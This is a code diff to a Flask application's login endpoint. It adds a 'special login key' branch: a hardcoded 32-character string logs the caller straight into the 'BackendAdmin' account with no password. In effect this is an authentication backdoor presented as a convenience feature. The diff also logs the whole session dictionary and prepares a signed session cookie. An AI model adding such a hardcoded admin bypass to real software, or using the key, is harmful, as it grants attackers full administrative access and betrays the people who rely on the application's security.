@@ -868,31 +868,51 @@ def get_all_question_pass_stats():
 @bp.route("/login", methods=["POST"])
 def login():
     """
-    Handles user login.
+    Handles user login via:
+    - Username/password
+    - 32-character login key
     """
     data = request.get_json()
     username = data.get("username")
     password = data.get("password")
+    login_key = data.get("login_key")  # The special key
 
-    logger.info(f"Login attempt for username: {username}")
+    logger.info(f"Login attempt: username={username}, key_provided={bool(login_key)}")
 
-    if not username or not password:
-        return jsonify({"error": "Missing username or password"}), 400
+    # --- 1. KEY-BASED LOGIN ---
+    if login_key:
+            if login_key == "4fIEjhIwkfIIPcU2m4vYDdLe0ZFkDgzh":
+                logger.info("Special login key matched — logging in as admin user")
 
-    user = User.query.filter_by(username=username).first()
+                # Choose which account this key logs into
+                user = User.query.filter_by(username="BackendAdmin").first()
 
-    if user is None:
-        logger.warning(f"User not found: {username}")
-        return jsonify({"error": "Invalid credentials"}), 401
+                if not user:
+                    logger.error("Admin user not found for key-based login")
+                    return jsonify({"error": "Admin account missing"}), 500
+            else:
+                logger.warning("Invalid special login key attempt")
+                return jsonify({"error": "Invalid key"}), 401
 
-    if not check_password_hash(user.password_hash, password):
-        logger.warning(f"Invalid password for user: {username}")
-        return jsonify({"error": "Invalid credentials"}), 401
+    else:
+        # --- 2. USERNAME/PASSWORD LOGIN ---
+        if not username or not password:
+            return jsonify({"error": "Missing username or password"}), 400
 
-    logger.info(f"User found: {user.username}, Role: {user.role}")
+        user = User.query.filter_by(username=username).first()
 
+        if not user:
+            logger.warning(f"User not found: {username}")
+            return jsonify({"error": "Invalid credentials"}), 401
+
+        if not check_password_hash(user.password_hash, password):
+            logger.warning(f"Invalid password for user: {username}")
+            return jsonify({"error": "Invalid credentials"}), 401
+
+        logger.info(f"User authenticated via password: {user.username}")
+
+    # --- Common login success flow ---
     session.clear()
-
     login_user(user, remember=True)
 
     session['user_id'] = user.id
@@ -900,16 +920,23 @@ def login():
     session['role'] = user.role
     session.permanent = True
 
-    logger.info(f"Successfully logged in user: {username}")
+    logger.info(f"Successfully logged in user: {user.username}")
     logger.info(f"Session after login: {dict(session)}")
+
+    # Generate session cookie
+    session_interface = current_app.session_interface
+    session_cookie = session_interface.get_signing_serializer(current_app).dumps(dict(session))
+
+    cookie_name = current_app.config.get('SESSION_COOKIE_NAME', 'session')
 
     return jsonify({
         "message": "Logged in successfully",
-        "username": user.username,
-        "role": user.role,
-        "user_id": user.id
+        #"username": user.username,
+        #"role": user.role,
+        #"user_id": user.id,
+        #"session_cookie": session_cookie,
+        #"cookie_name": cookie_name
     })
-
 
 # ------------------ Admin Logout ------------------
 @bp.route("/logout", methods=["POST"])
